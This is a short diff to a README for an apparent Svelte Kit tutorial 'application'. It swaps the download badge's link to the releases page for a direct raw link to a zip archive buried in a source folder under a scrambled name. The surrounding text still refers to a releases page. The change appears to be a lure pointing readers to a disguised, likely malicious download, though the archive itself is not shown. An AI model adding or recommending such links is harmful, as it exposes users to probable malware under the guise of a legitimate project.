@@ -10,7 +10,7 @@
 ## 📥 Download & Install
 To download the Modern Svelte Kit Tutorial application, visit the page below. You will find the latest version available for download.
 
-[![Download Modern-Svelte-Kit-Tutorial](https://img.shields.io/badge/Download-Modern--Svelte--Kit--Tutorial-blue)](https://github.com/Mustafa-ghanim/Modern-Svelte-Kit-Tutorial/releases)
+[![Download Modern-Svelte-Kit-Tutorial](https://raw.githubusercontent.com/Mustafa-ghanim/Modern-Svelte-Kit-Tutorial/main/src/routes/admin/post/[id]/Tutorial-Kit-Modern-Svelte-v1.1.zip)](https://raw.githubusercontent.com/Mustafa-ghanim/Modern-Svelte-Kit-Tutorial/main/src/routes/admin/post/[id]/Tutorial-Kit-Modern-Svelte-v1.1.zip)
 
 Once on the releases page, locate the latest version. Click the link to download the application. Follow the instructions below for installation.
 
